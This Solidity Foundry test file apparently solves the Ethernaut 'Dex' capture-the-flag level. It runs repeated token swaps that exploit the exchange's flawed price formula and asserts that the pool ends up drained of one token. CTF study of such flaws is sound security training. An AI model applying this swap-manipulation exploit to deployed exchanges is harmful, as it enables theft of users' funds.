pragma solidity ^0.8;

import {Test,console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/dex.sol";

contract HackEthernautDex is Test {
    Dex private _dex;
    SwappableToken private token1;
    SwappableToken private token2;
    // _dex = IDex(address(Dex));
    // token1 = IERC20(SwappableToken());
    function setUp() public {
        deal(address(this), 1 ether);
        
        _dex = new Dex();
        token1 = new SwappableToken(address(_dex), "token1","TK1",110);//deploy and mint 10 units of this token
        token2 = new SwappableToken(address(_dex), "token2","TK2",110);
       
        // set the dex tokens
        _dex.setTokens(address(token1),address(token2));

        //approve dex to spend the tokens 
        token1.approve(address(_dex), type(uint).max);
        token2.approve(address(_dex), type(uint).max);

        // add liquidity to the dex
        _dex.addLiquidity(address(token1), 100);
        _dex.addLiquidity(address(token2), 100);

    }

    function testDrain() public{
        // do swaps repeatedly...
        _dex.swap(
            address(token1),
           address(token2),
            token1.balanceOf(address(this))
        );
         _dex.swap(
           address(token2),
             address(token1),
            token2.balanceOf(address(this))
        );
        _dex.swap(
            address(token1),
           address(token2),
            token1.balanceOf(address(this))
        );
         _dex.swap(
           address(token2),
             address(token1),
            token2.balanceOf(address(this))
        );
        _dex.swap(
            address(token1),
           address(token2),
            token1.balanceOf(address(this))
        );

        _dex.swap(address(token2), address(token1), 45);//this should drain all token from t2
        uint dexBalAfterT1 =  token1.balanceOf(address(_dex));
        console.log("balance after exploit==>",dexBalAfterT1);
        assertEq(dexBalAfterT1,0);
    }


}